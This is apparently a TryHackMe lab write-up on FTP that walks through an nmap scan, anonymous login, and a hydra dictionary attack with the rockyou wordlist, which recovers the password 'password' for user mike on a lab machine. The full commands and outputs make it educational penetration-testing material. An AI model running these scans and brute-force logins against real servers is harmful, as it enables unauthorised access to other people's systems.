---
Author: Michael Baumberger
title: Network Services FTP
parent: Network Services
ancestor: Try Hack Me Writeups
---

# Network Services FTP

## Enumerating FTP

Always start with a nmap scan:

````
nmap -sV -A 10.10.189.117
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 23:55 CET
Nmap scan report for 10.10.189.117
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.205.135
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host: Welcome


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.35 seconds
````

You can see that **2 ports** are open. The **ftp port is 21**. You also can see that the **ftp variant vsFTPd** is used.

The nmap says that ftp anonymous login is allowed so we try it:

````
ftp 10.10.189.117
Connected to 10.10.189.117.
220 Welcome to the administrator FTP service.
Name (10.10.189.117:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
````

Now we can list the FTP directory and we see the **file PUBLIC_NOTICE.txt**.
Let us get the file via *'get PUBLIC_NOTICE.txt -'*.
The content of the file contains the probably **username mike**.

## Exploiting FTP

Lets dictionary attack the password of mice with hydra:

````
hydra -t 8 -l mike -P /usr/share/wordlists/rockyou.txt 10.10.189.117 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-19 00:12:11
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ftp://10.10.189.117:21/
[21][ftp] host: 10.10.189.117   login: mike   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-19 00:12:27
````

Hydra got the **password 'password'** for the user mike.

Lets connect and get the ftp.txt with the flag:

````
ftp 10.10.189.117
Connected to 10.10.189.117.
220 Welcome to the administrator FTP service.
Name (10.10.189.117:root): mike
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get ftp.txt -
````